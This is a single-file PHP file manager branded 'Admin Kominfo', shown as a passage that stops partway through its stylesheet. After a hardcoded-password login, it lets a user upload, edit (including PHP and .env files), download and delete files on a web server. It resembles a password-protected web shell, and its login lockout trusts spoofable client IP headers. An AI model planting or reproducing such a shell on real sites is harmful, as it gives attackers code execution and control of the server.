<?php
session_start();

// Konfigurasi brute force protection
define('MAX_LOGIN_ATTEMPTS', 5);
define('LOCKOUT_DURATION', 900); // 15 menit dalam detik

// File untuk menyimpan data brute force
$bruteForceFile = sys_get_temp_dir() . '/filemanager_brute_force.json';

// Fungsi untuk mendapatkan IP client
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}

// Fungsi untuk load brute force data
function loadBruteForceData() {
    global $bruteForceFile;
    if (file_exists($bruteForceFile)) {
        $data = json_decode(file_get_contents($bruteForceFile), true);
        return $data ?? [];
    }
    return [];
}

// Fungsi untuk save brute force data
function saveBruteForceData($data) {
    global $bruteForceFile;
    file_put_contents($bruteForceFile, json_encode($data, JSON_PRETTY_PRINT));
}

// Fungsi untuk cek IP di-blok
function isIPBlocked($ip) {
    $data = loadBruteForceData();
    if (isset($data[$ip])) {
        $entry = $data[$ip];
        $currentTime = time();
        
        // Kalau lockout time sudah lewat, hapus entry
        if ($currentTime - $entry['locked_at'] > LOCKOUT_DURATION) {
            $data = loadBruteForceData();
            unset($data[$ip]);
            saveBruteForceData($data);
            return false;
        }
        
        // Masih dalam lockout period
        if ($entry['attempts'] >= MAX_LOGIN_ATTEMPTS) {
            return true;
        }
    }
    return false;
}

// Fungsi untuk increment attempt
function recordFailedLogin($ip) {
    $data = loadBruteForceData();
    $currentTime = time();
    
    if (!isset($data[$ip])) {
        $data[$ip] = [
            'attempts' => 0,
            'last_attempt' => $currentTime,
            'locked_at' => null
        ];
    }
    
    $data[$ip]['attempts']++;
    $data[$ip]['last_attempt'] = $currentTime;
    
    // Kalau sudah >= MAX_LOGIN_ATTEMPTS, lock IP
    if ($data[$ip]['attempts'] >= MAX_LOGIN_ATTEMPTS) {
        $data[$ip]['locked_at'] = $currentTime;
    }
    
    saveBruteForceData($data);
}

// Fungsi untuk reset login attempts
function resetLoginAttempts($ip) {
    $data = loadBruteForceData();
    if (isset($data[$ip])) {
        unset($data[$ip]);
        saveBruteForceData($data);
    }
}

$correctPasswordHash = '$2y$10$u0LRXNXe3JeFZuQSrIrASu3Puc.wNLrtXWvRntANJ8h03Xfnnr4YK';
$isLoggedIn = isset($_SESSION['filemanager_auth']) && $_SESSION['filemanager_auth'] === true;

// Check IP blocking
$clientIP = getClientIP();
$isIPLocked = isIPBlocked($clientIP);

// Handle login
$loginError = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if ($isIPLocked) {
        $data = loadBruteForceData();
        $remainingTime = LOCKOUT_DURATION - (time() - $data[$clientIP]['locked_at']);
        $minutes = ceil($remainingTime / 60);
        $loginError = "❌ Terlalu banyak upaya login gagal. IP Anda dikunci selama $minutes menit lagi. Coba lagi nanti.";
    } else {
        if (password_verify($_POST['password'], $correctPasswordHash)) {
            $_SESSION['filemanager_auth'] = true;
            $_SESSION['start_time'] = time();
            resetLoginAttempts($clientIP);
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            recordFailedLogin($clientIP);
            $data = loadBruteForceData();
            $attempts = $data[$clientIP]['attempts'];
            $remaining = MAX_LOGIN_ATTEMPTS - $attempts;
            
            if ($attempts >= MAX_LOGIN_ATTEMPTS) {
                $loginError = "❌ Password salah! Terlalu banyak upaya gagal. IP Anda dikunci selama 15 menit.";
            } else {
                $loginError = "❌ Password salah! Sisa upaya: $remaining dari " . MAX_LOGIN_ATTEMPTS;
            }
        }
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Jika belum login, tampilkan form login
if (!$isLoggedIn) {
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🔐 Admin Kominfo Admin Manager - Login</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Poppins', 'Segoe UI', sans-serif;
                background: #f8f9fa;
                background-attachment: fixed;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                overflow: hidden;
            }
            
            .login-container {
                background: white;
                padding: 48px 40px;
                border-radius: 16px;
                box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12), 0 2px 6px rgba(0, 0, 0, 0.06);
                width: 100%;
                max-width: 420px;
                position: relative;
                z-index: 1;
                animation: slideUp 0.5s ease-out;
            }
            
            @keyframes slideUp {
                from {
                    opacity: 0;
                    transform: translateY(20px);
                }
                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }
            
            .login-header {
                text-align: center;
                margin-bottom: 36px;
            }
            
            .lock-icon {
                font-size: 48px;
                margin-bottom: 16px;
            }
            
            .login-container h1 {
                color: #1a202c;
                margin-bottom: 8px;
                font-size: 28px;
                font-weight: 700;
                letter-spacing: -0.01em;
            }
            
            .login-container p {
                color: #718096;
                font-size: 14px;
                margin-bottom: 8px;
                line-height: 1.6;
            }
            
            .form-group {
                margin-bottom: 20px;
                position: relative;
            }
            
            .form-group label {
                display: block;
                margin-bottom: 8px;
                color: #2d3748;
                font-weight: 600;
                font-size: 13px;
                letter-spacing: 0.02em;
            }
            
            .form-group input {
                width: 100%;
                padding: 12px 14px;
                border: 1px solid #cbd5e0;
                border-radius: 8px;
                font-size: 15px;
                transition: all 0.25s ease;
                background: #f7fafc;
                font-family: 'Segoe UI', sans-serif;
            }
            
            .form-group input:focus {
                outline: none;
                border-color: #667eea;
                background: white;
                box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.08);
            }
            
            .submit-btn {
                width: 100%;
                padding: 12px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                border-radius: 8px;
                font-size: 15px;
                font-weight: 700;
                cursor: pointer;
                transition: all 0.25s ease;
                position: relative;
                overflow: hidden;
            }
            
            .submit-btn:disabled {
                opacity: 0.6;
                cursor: not-allowed;
            }
            
            .submit-btn::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: rgba(255, 255, 255, 0.15);
                transition: left 0.25s ease;
            }
            
            .submit-btn:hover:not(:disabled) {
                transform: translateY(-2px);
                box-shadow: 0 6px 16px rgba(102, 126, 234, 0.24);
            }
            
            .submit-btn:hover:not(:disabled)::before {
                left: 100%;
            }
            
            .error-message {
                background: #fff5f5;
                color: #742a2a;
                padding: 13px 14px;
                border-radius: 8px;
                margin-bottom: 18px;
                font-size: 13px;
                animation: shake 0.4s ease-in-out;
                border-left: 3px solid #fc8181;
                line-height: 1.6;
            }
            
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                25% { transform: translateX(-3px); }
                75% { transform: translateX(3px); }
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <img src="https://www.idn.id/wp-content/uploads/2024/12/kominfo.png" alt="Kominfo Logo" style="width: 72px; height: 72px; margin-bottom: 16px; border-radius: 12px;">
                <h1>Admin Kominfo</h1>
                <p>File Manager Administratif</p>
            </div>
            <?php if (isset($loginError) && $loginError !== ''): ?>
                <div class="error-message"><?php echo $loginError; ?></div>
            <?php endif; ?>
            <form method="POST">
                <div class="form-group">
                    <label for="password">🔑 Kode Akses:</label>
                    <input type="password" id="password" name="password" placeholder="Masukkan kode Anda..." required autofocus <?php echo $isIPLocked ? 'disabled' : ''; ?>>
                </div>
                <button type="submit" class="submit-btn" <?php echo $isIPLocked ? 'disabled' : ''; ?>>🚀 Buka Vault</button>
                <?php if ($isIPLocked): ?>
                    <p style="text-align: center; color: #f56565; margin-top: 12px; font-size: 12px; font-weight: 600;">
                        ⏳ Login diblok. Coba lagi dalam beberapa menit.
                    </p>
                <?php endif; ?>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// User sudah login - tampilkan file manager
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : $_SERVER['DOCUMENT_ROOT'];

// Validasi directory path untuk keamanan
$currentDir = realpath($currentDir);
if ($currentDir === false || strpos($currentDir, $_SERVER['DOCUMENT_ROOT']) !== 0) {
    $currentDir = $_SERVER['DOCUMENT_ROOT'];
}

// Fungsi utilitas
function formatBytes($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);

    if ($bytes === 0) {
        return '0 B';
    }

    $pow = floor(log($bytes) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);

    return round($bytes, 2) . ' ' . $units[$pow];
}

function is_empty_directory($dir) {
    $handle = opendir($dir);

    while (($file = readdir($handle)) !== false) {
        if ($file !== '.' && $file !== '..') {
            closedir($handle);
            return false;
        }
    }

    closedir($handle);
    return true;
}

function resolveChildPath($baseDir, $itemName, $mustExist = true) {
    $baseReal = realpath($baseDir);
    if ($baseReal === false) {
        return false;
    }

    $candidate = $baseReal . DIRECTORY_SEPARATOR . basename($itemName);
    if (!$mustExist) {
        return $candidate;
    }

    $resolved = realpath($candidate);
    if ($resolved === false) {
        return false;
    }

    if ($resolved !== $baseReal && strpos($resolved, $baseReal . DIRECTORY_SEPARATOR) !== 0) {
        return false;
    }

    return $resolved;
}

function getMimeTypeSafe($filePath) {
    if (function_exists('mime_content_type')) {
        $mime = mime_content_type($filePath);
        if ($mime !== false) {
            return $mime;
        }
    }

    return 'application/octet-stream';
}

function isEditableFile($filePath) {
    if (!is_file($filePath) || filesize($filePath) > 1024 * 1024 * 2) {
        return false;
    }

    $mime = getMimeTypeSafe($filePath);
    $extension = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
    $editableExtensions = [
        'txt', 'md', 'json', 'xml', 'html', 'htm', 'css', 'js', 'ts', 'php', 'py',
        'java', 'c', 'cpp', 'h', 'hpp', 'cs', 'sh', 'env', 'ini', 'sql', 'yml', 'yaml', 'log'
    ];

    if (strpos($mime, 'text/') === 0) {
        return true;
    }

    return in_array($extension, $editableExtensions, true)
        || in_array($mime, ['application/json', 'application/xml', 'application/x-httpd-php'], true);
}

function getFileTypeLabel($fileName, $filePath = null) {
    if ($filePath !== null && is_dir($filePath)) {
        return 'Folder';
    }

    $extension = strtoupper(pathinfo($fileName, PATHINFO_EXTENSION));
    return $extension !== '' ? $extension : 'FILE';
}

function buildQuery(array $params) {
    return '?' . http_build_query($params);
}

$message = '';
$errorMessage = '';
$uploadMessage = '';
$selectedPanel = null;

// Handle file operations
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    $file = isset($_GET['file']) ? $_GET['file'] : '';

    if (in_array($action, ['download', 'stream'], true) && !empty($file)) {
        $filePath = resolveChildPath($currentDir, $file);

        if ($filePath !== false && is_file($filePath)) {
            $mime = getMimeTypeSafe($filePath);
            header('Content-Type: ' . $mime);
            header('Content-Length: ' . filesize($filePath));
            header('Content-Disposition: ' . ($action === 'download' ? 'attachment' : 'inline') . '; filename="' . basename($filePath) . '"');
            readfile($filePath);
            exit;
        }

        http_response_code(404);
        exit('File tidak ditemukan.');
    }

    if ($action === 'delete' && !empty($file)) {
        $filePath = resolveChildPath($currentDir, $file);

        if ($filePath !== false && is_file($filePath)) {
            if (@unlink($filePath)) {
                $message = 'File berhasil dihapus!';
            } else {
                $errorMessage = 'File gagal dihapus.';
            }
        } else {
            $errorMessage = 'File tidak ditemukan.';
        }
    } elseif ($action === 'deletedir' && !empty($file)) {
        $dirPath = resolveChildPath($currentDir, $file);

        if ($dirPath !== false && is_dir($dirPath) && is_empty_directory($dirPath)) {
            if (@rmdir($dirPath)) {
                $message = 'Folder berhasil dihapus!';
            } else {
                $errorMessage = 'Folder gagal dihapus.';
            }
        } else {
            $errorMessage = 'Folder tidak kosong atau tidak dapat dihapus!';
        }
    }
}

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $uploadedFile = $_FILES['file'];
    $targetPath = resolveChildPath($currentDir, $uploadedFile['name'], false);

    if (!empty($uploadedFile['name']) && $targetPath !== false && move_uploaded_file($uploadedFile['tmp_name'], $targetPath)) {
        $uploadMessage = 'File berhasil diupload!';
    } else {
        $errorMessage = 'Gagal mengupload file!';
    }
}

// Handle create folder
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newfolder'])) {
    $folderName = trim($_POST['newfolder']);
    $newFolderPath = resolveChildPath($currentDir, $folderName, false);

    if ($folderName === '') {
        $errorMessage = 'Nama folder tidak boleh kosong.';
    } elseif ($newFolderPath !== false && !file_exists($newFolderPath)) {
        if (@mkdir($newFolderPath, 0755)) {
            $message = 'Folder berhasil dibuat!';
        } else {
            $errorMessage = 'Folder gagal dibuat.';
        }
    } else {
        $errorMessage = 'Folder sudah ada!';
    }
}

// Handle save file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['savefile'], $_POST['filename'])) {
    $fileName = basename($_POST['filename']);
    $filePath = resolveChildPath($currentDir, $fileName);

    if ($filePath === false || !is_file($filePath)) {
        $errorMessage = 'File tidak ditemukan untuk disimpan.';
    } elseif (!isEditableFile($filePath)) {
        $errorMessage = 'Tipe file ini tidak diizinkan untuk diedit.';
    } elseif (!is_writable($filePath)) {
        $errorMessage = 'File tidak memiliki izin tulis.';
    } else {
        $newContent = isset($_POST['content']) ? $_POST['content'] : '';
        if (file_put_contents($filePath, $newContent) !== false) {
            $message = 'Perubahan file berhasil disimpan!';
            $_GET['action'] = 'edit';
            $_GET['file'] = $fileName;
        } else {
            $errorMessage = 'Gagal menyimpan perubahan file.';
        }
    }
}

$activeAction = isset($_GET['action']) ? $_GET['action'] : '';
$selectedFile = isset($_GET['file']) ? basename($_GET['file']) : '';

if (in_array($activeAction, ['view', 'edit'], true) && $selectedFile !== '') {
    $selectedPath = resolveChildPath($currentDir, $selectedFile);

    if ($selectedPath !== false && is_file($selectedPath)) {
        $selectedMime = getMimeTypeSafe($selectedPath);
        $selectedIsEditable = isEditableFile($selectedPath);
        $selectedIsImage = strpos($selectedMime, 'image/') === 0;
        $selectedIsPdf = $selectedMime === 'application/pdf';
        $selectedIsMedia = strpos($selectedMime, 'audio/') === 0 || strpos($selectedMime, 'video/') === 0;
        $selectedPanel = [
            'mode' => $activeAction,
            'name' => $selectedFile,
            'path' => $selectedPath,
            'mime' => $selectedMime,
            'size' => filesize($selectedPath),
            'updated' => date('d M Y H:i', filemtime($selectedPath)),
            'editable' => $selectedIsEditable,
            'image' => $selectedIsImage,
            'pdf' => $selectedIsPdf,
            'media' => $selectedIsMedia,
            'content' => $selectedIsEditable ? file_get_contents($selectedPath) : null,
        ];

        if ($activeAction === 'edit' && !$selectedIsEditable) {
            $errorMessage = 'File ini tidak bisa diedit dari panel editor.';
            $selectedPanel = null;
        }
    } else {
        $errorMessage = 'File tidak ditemukan.';
    }
}

// Baca direktori
$files = scandir($currentDir);
$folders = [];
$filesList = [];
$totalFileSize = 0;

foreach ($files as $file) {
    if ($file === '.' || $file === '..') {
        continue;
    }

    $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;

    if (is_dir($filePath)) {
        $folders[] = $file;
    } else {
        $filesList[] = $file;
        $totalFileSize += filesize($filePath);
    }
}

sort($folders);
sort($filesList);

// Parent directory
$parentDir = dirname($currentDir);
if (strpos($parentDir, $_SERVER['DOCUMENT_ROOT']) !== 0) {
    $parentDir = $_SERVER['DOCUMENT_ROOT'];
}

?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🏛️ Admin Kominfo Admin Manager</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-dark: #0f172a;
            --bg-card: rgba(255, 255, 255, 0.95);
            --bg-soft: rgba(255, 255, 255, 0.72);
            --primary: #6366f1;
            --primary-dark: #4338ca;
            --accent: #ec4899;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --text: #0f172a;
            --muted: #64748b;
            --border: rgba(148, 163, 184, 0.2);
            --shadow: 0 16px 40px rgba(15, 23, 42, 0.12);
        }

        body {
            font-family: 'Poppins', 'Segoe UI', sans-serif;
            min-height: 100vh;
            color: var(--text);
            background:
                radial-gradient(circle at top left, rgba(99, 102, 241, 0.28), transparent 35%),
                radial-gradient(circle at bottom right, rgba(236, 72, 153, 0.25), transparent 35%),
                linear-gradient(135deg, #0f172a 0%, #1e1b4b 45%, #111827 100%);
            background-attachment: fixed;
            padding: 32px 24px;
        }

        .container {
            max-width: 1320px;
            margin: 0 auto;
        }

        .hero {
            display: grid;
            grid-template-columns: 1.8fr 1fr;
            gap: 24px;
            margin-bottom: 28px;
        }

        .hero-card,
        .stats-card,
        .path-bar,
        .control-card,
        .panel,
        .table-shell {
            background: var(--bg-card);
            backdrop-filter: blur(20px);
            border: 1px solid var(--border);
            border-radius: 20px;
            box-shadow: var(--shadow);
        }

        .hero-card {
            padding: 32px;
            position: relative;
            overflow: hidden;
        }

        .hero-card::after {
            content: '';
            position: absolute;
            inset: auto -50px -50px auto;
            width: 200px;
            height: 200px;
            border-radius: 999px;
            background: linear-gradient(135deg, rgba(99, 102, 241, 0.15), rgba(236, 72, 153, 0.12));
        }

        .hero-top {
            display: flex;
            justify-content: space-between;
            gap: 20px;
            align-items: flex-start;
            position: relative;
            z-index: 1;
        }

        .brand {
            display: flex;
            gap: 18px;
            align-items: center;
        }

        .brand img {
            width: 72px;
            height: 72px;
            border-radius: 16px;
            object-fit: cover;
            box-shadow: 0 12px 20px rgba(99, 102, 241, 0.2);
            flex-shrink: 0;
        }

        .eyebrow {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            font-size: 11px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 0.2em;
            color: var(--primary);
            margin-bottom: 8px;
        }

        .hero h1 {
            font-size: 36px;
            line-height: 1.1;
            margin-bottom: 12px;
            font-weight: 800;
            letter-spacing: -0.02em;
        }

        .hero p {
            color: var(--muted);
            max-width: 680px;
            line-height: 1.65;
            font-size: 15px;
        }

        .logout-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 11px 20px;
            border-radius: 12px;
            text-decoration: none;
            font-weight: 700;
            font-size: 14px;
            color: white;
            background: linear-gradient(135deg, #fb7185, #ef4444);
            box-shadow: 0 12px 24px rgba(239, 68, 68, 0.24);
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            white-space: nowrap;
        }

        .logout-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 16px 32px rgba(239, 68, 68, 0.3);
        }

        .hero-meta {
            margin-top: 20px;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            position: relative;
            z-index: 1;
        }

        .meta-pill {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 9px 13px;
            border-radius: 999px;
            background: rgba(99, 102, 241, 0.09);
            color: var(--primary-dark);
            font-size: 12px;
            font-weight: 700;
            white-space: nowrap;
        }

        .stats-card {
            padding: 20px;
            display: grid;
            gap: 12px;
        }

        .stat {
            padding: 16px;
            border-radius: 16px;
            background: linear-gradient(135deg, rgba(99, 102, 241, 0.09), rgba(255, 255, 255, 0.68));
            border: 1px solid rgba(99, 102, 241, 0.1);
        }

        .stat span {
            display: block;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.15em;
            color: var(--muted);
            margin-bottom: 6px;
            font-weight: 800;
        }

        .stat strong {
            font-size: 26px;
            font-weight: 800;
            letter-spacing: -0.01em;
        }

        .stat small {
            color: var(--muted);
            display: block;
            margin-top: 6px;
            font-size: 12px;
        }

        .path-bar {
            padding: 16px 20px;
            margin-bottom: 24px;
            display: flex;
            gap: 14px;
            align-items: center;
            flex-wrap: wrap;
        }

        .path-bar strong {
            color: var(--primary-dark);
            font-size: 13px;
            font-weight: 800;
        }

        .path-links {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }

        .path-links a,
        .path-links span {
            padding: 8px 12px;
            border-radius: 10px;
            text-decoration: none;
            font-size: 13px;
            font-weight: 600;
        }

        .path-links a {
            background: rgba(99, 102, 241, 0.08);
            color: var(--primary-dark);
            transition: all 0.2s ease;
        }

        .path-links a:hover {
            transform: translateY(-1px);
            background: rgba(99, 102, 241, 0.15);
        }

        .path-links span {
            color: var(--muted);
        }

        .notice {
            padding: 14px 16px;
            border-radius: 14px;
            margin-bottom: 20px;
            font-weight: 600;
            font-size: 14px;
            box-shadow: var(--shadow);
            border: 1px solid transparent;
        }

        .notice.success {
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.16), rgba(236, 253, 245, 0.95));
            color: #065f46;
            border-color: rgba(16, 185, 129, 0.18);
        }

        .notice.error {
            background: linear-gradient(135deg, rgba(239, 68, 68, 0.14), rgba(254, 242, 242, 0.95));
            color: #991b1b;
            border-color: rgba(239, 68, 68, 0.18);
        }

        .controls-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 28px;
        }

        .control-card {
            padding: 22px;
        }

        .control-card h3 {
            font-size: 18px;
            margin-bottom: 6px;
            font-weight: 700;
            letter-spacing: -0.01em;
        }

        .control-card p {
            color: var(--muted);
            font-size: 13px;
            margin-bottom: 16px;
            line-height: 1.6;
        }

        .form-inline {
            display: grid;
            gap: 12px;
        }

        .form-inline input,
        .form-inline textarea,
        .form-inline button,
        .action-link {
            width: 100%;
            border-radius: 12px;
            border: 1px solid rgba(148, 163, 184, 0.28);
            padding: 12px 14px;
            font-family: inherit;
            font-size: 14px;
        }

        .form-inline input,
        .form-inline textarea {
            background: rgba(248, 250, 252, 0.95);
            color: var(--text);
        }

        .form-inline input:focus,
        .form-inline textarea:focus {
            outline: none;
            border-color: rgba(99, 102, 241, 0.48);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }

        .form-inline button,
        .action-link {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            text-decoration: none;
            cursor: pointer;
            border: none;
            font-weight: 700;
            color: white;
            background: linear-gradient(135deg, var(--primary), var(--accent));
            box-shadow: 0 12px 20px rgba(99, 102, 241, 0.2);
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            font-size: 14px;
        }

        .form-inline button:hover,
        .action-link:hover {
            transform: translateY(-2px);
            box-shadow: 0 16px 28px rgba(99, 102, 241, 0.26);
        }

        .action-link.secondary {
            background: linear-gradient(135deg, #0ea5e9, #2563eb);
        }

        .panel {
            padding: 28px;
            margin-bottom: 28px;
        }

        .panel-header {
            display: flex;
            justify-content: space-between;
            gap: 20px;
            align-items: flex-start;
            margin-bottom: 22px;
            flex-wrap: wrap;
        }

        .panel-header h2 {
            font-size: 26px;
            margin-bottom: 6px;
            font-weight: 800;
            letter-spacing: -0.01em;
        }

        .panel-header p {
            color: var(--muted);
            font-size: 14px;
        }

        .panel-tags {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 10px;
        }

        .tag {
            padding: 8px 12px;
            border-radius: 999px;
            background: rgba(99, 102, 241, 0.08);
            color: var(--primary-dark);
            font-weight: 700;
            font-size: 12px;
        }

        .preview-box,
        .editor-box {
            border-radius: 16px;
            background: #0f172a;
            color: #e2e8f0;
            overflow: hidden;
            border: 1px solid rgba(148, 163, 184, 0.14);
        }

        .preview-text,
        .editor-box textarea {
            width: 100%;
            min-height: 400px;
            padding: 20px;
            border: none;
            resize: vertical;
            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
            font-size: 13px;
            line-height: 1.7;
            white-space: pre-wrap;
            overflow-wrap: anywhere;
            background: transparent;
            color: inherit;
        }

        .editor-box textarea:focus {
            outline: none;
        }

        .preview-media {
            background: #020617;
            padding: 18px;
            display: flex;
            justify-content: center;
        }

        .preview-media img,
        .preview-media iframe,
        .preview-media video,
        .preview-media audio {
            width: 100%;
            max-height: 70vh;
            border: none;
            border-radius: 14px;
            background: white;
        }

        .preview-fallback {
            padding: 20px;
            background: rgba(15, 23, 42, 0.92);
            color: #cbd5e1;
        }

        .panel-actions {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 14px;
        }

        .panel-actions a,
        .panel-actions button {
            padding: 11px 16px;
            border-radius: 12px;
            text-decoration: none;
            font-size: 13px;
            font-weight: 700;
            border: none;
            cursor: pointer;
            color: white;
            background: linear-gradient(135deg, var(--primary), var(--accent));
        }

        .panel-actions a.alt {
            background: linear-gradient(135deg, #0ea5e9, #2563eb);
        }

        .table-shell {
            overflow: hidden;
        }

        .table-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 16px;
            padding: 24px;
            border-bottom: 1px solid rgba(148, 163, 184, 0.15);
        }

        .table-header h2 {
            font-size: 22px;
            font-weight: 800;
            letter-spacing: -0.01em;
        }

        .table-header p {
            color: var(--muted);
            font-size: 14px;
        }

        .table-meta {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .table-meta span {
            padding: 8px 12px;
            border-radius: 999px;
            background: rgba(99, 102, 241, 0.08);
            color: var(--primary-dark);
            font-size: 12px;
            font-weight: 700;
        }

        .table-wrap {
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 920px;
        }

        thead {
            background: linear-gradient(135deg, #1e1b4b, #312e81);
            color: white;
        }

        th {
            padding: 14px 18px;
            text-align: left;
            font-size: 11px;
            letter-spacing: 0.1em;
            text-transform: uppercase;
            font-weight: 800;
        }

        td {
            padding: 16px 18px;
            border-bottom: 1px solid rgba(226, 232, 240, 0.88);
            vertical-align: middle;
        }

        tbody tr:hover {
            background: rgba(99, 102, 241, 0.03);
        }

        .item-name {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .item-icon {
            width: 40px;
            height: 40px;
            border-radius: 12px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, rgba(99, 102, 241, 0.12), rgba(236, 72, 153, 0.09));
            font-size: 20px;
            flex-shrink: 0;
        }

        .item-link {
            text-decoration: none;
            color: var(--text);
            font-weight: 700;
            font-size: 15px;
        }

        .item-link:hover {
            color: var(--primary-dark);
        }

        .item-subtitle {
            display: block;
            color: var(--muted);
            font-size: 12px;
            margin-top: 4px;
        }

        .type-badge {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 7px 11px;
            border-radius: 999px;
            background: rgba(14, 165, 233, 0.1);
            color: #075985;
            font-size: 11px;
            font-weight: 800;
        }

        .actions {
            display: flex;
            flex-wrap: nowrap;
            gap: 6px;
            align-items: center;
        }

        .actions a {
            padding: 8px 11px;
            border-radius: 10px;
            text-decoration: none;
            font-size: 12px;
            font-weight: 700;
            color: white;
            background: linear-gradient(135deg, var(--primary), var(--accent));
            transition: transform 0.2s ease, opacity 0.2s ease;
            white-space: nowrap;
        }

        .actions a:hover {
            transform: translateY(-1px);
            opacity: 0.92;
        }

        .actions a.download {
            background: linear-gradient(135deg, #0ea5e9, #2563eb);
        }

        .actions a.edit {
            background: linear-gradient(135deg, #8b5cf6, #7c3aed);
        }

        .actions a.delete {
            background: linear-gradient(135deg, #fb7185, #ef4444);
        }

        .empty-message {
            text-align: center;
            padding: 64px 24px;
            color: var(--muted);
        }

        .empty-message strong {
            display: block;
            font-size: 18px;
            color: var(--text);
            margin-bottom: 8px;
            font-weight: 700;
        }

        @media (max-width: 1024px) {
            .hero {
                grid-template-columns: 1fr;
            }
        }

        @media (max-width: 768px) {
            body {
                padding: 16px 12px;
            }

            .container {
                max-width: 100%;
            }

            .hero {
                grid-template-columns: 1fr;
                gap: 16px;
                margin-bottom: 20px;
            }

            .hero-card,
            .stats-card,
            .path-bar,
            .control-card,
            .panel,
            .table-shell {
                border-radius: 14px;
            }

            .hero-card {
                padding: 20px;
            }

            .hero-top {
                flex-direction: column;
                gap: 16px;
            }

            .brand {
                gap: 12px;
            }

            .brand img {
                width: 56px;
                height: 56px;
                border-radius: 12px;
            }

            .hero h1 {
                font-size: 26px;
                line-height: 1.15;
            }

            .hero p {
                font-size: 14px;
                line-height: 1.6;
            }

            .logout-btn {
                width: 100%;
                padding: 10px 16px;
                font-size: 13px;
            }

            .hero-meta {
                margin-top: 16px;
                gap: 8px;
            }

            .meta-pill {
                font-size: 11px;
                padding: 8px 11px;
            }

            .stats-card {
                padding: 16px;
                gap: 10px;
            }

            .stat {
                padding: 14px;
            }

            .stat span {
                font-size: 10px;
            }

            .stat strong {
                font-size: 22px;
            }

            .path-bar {
                padding: 14px 16px;
                margin-bottom: 16px;
                gap: 10px;
            }

            .path-bar strong {
                font-size: 12px;
            }

            .path-links {
                gap: 6px;
            }

            .path-links a,
            .path-links span {
                padding: 6px 10px;
                font-size: 12px;
                border-radius: 8px;
            }

            .notice {
                padding: 12px 14px;
                margin-bottom: 16px;
                font-size: 13px;
                border-radius: 12px;
            }

            .controls-grid {
                grid-template-columns: 1fr;
                gap: 16px;
                margin-bottom: 20px;
            }

            .control-card {
                padding: 16px;
            }

            .control-card h3 {
                font-size: 16px;
                margin-bottom: 6px;
            }

            .control-card p {
                font-size: 12px;
                margin-bottom: 12px;
            }

            .form-inline {
                gap: 10px;
            }

            .form-inline input,
            .form-inline textarea,
            .form-inline button,
            .action-link {
                border-radius: 10px;
                border: 1px solid rgba(148, 163, 184, 0.26);
                padding: 11px 13px;
                font-size: 13px;
            }

            .form-inline button,
            .action-link {
                padding: 11px 14px;
                font-size: 13px;
                font-weight: 700;
            }

            .panel {
                padding: 18px;
                margin-bottom: 20px;
            }

            .panel-header {
                gap: 12px;
